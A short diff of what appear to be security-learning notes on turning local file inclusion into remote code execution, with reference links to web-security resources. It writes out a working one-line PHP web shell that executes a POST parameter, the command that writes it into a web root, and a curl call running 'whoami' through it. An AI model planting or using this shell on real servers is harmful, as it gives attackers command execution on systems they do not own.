@@ -348,10 +348,15 @@ save as file named hack.php
 
 should be limited shell
 
-sudo echo -e “<?=\`\$_POST[vipertooth]\`?>\r<?='PHP Test';?>” > /var/www/html/test.php
+```sudo echo -e “<?=\`\$_POST[vipertooth]\`?>\r<?='PHP Test';?>” > /var/www/html/test.php```
 
 `curl localhost/test.php -d vipertooth=whoami`
 
+
+
+
+
 Referances:
 
-https://portswigger.net/web-security
+https://portswigger.net/web-security  
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
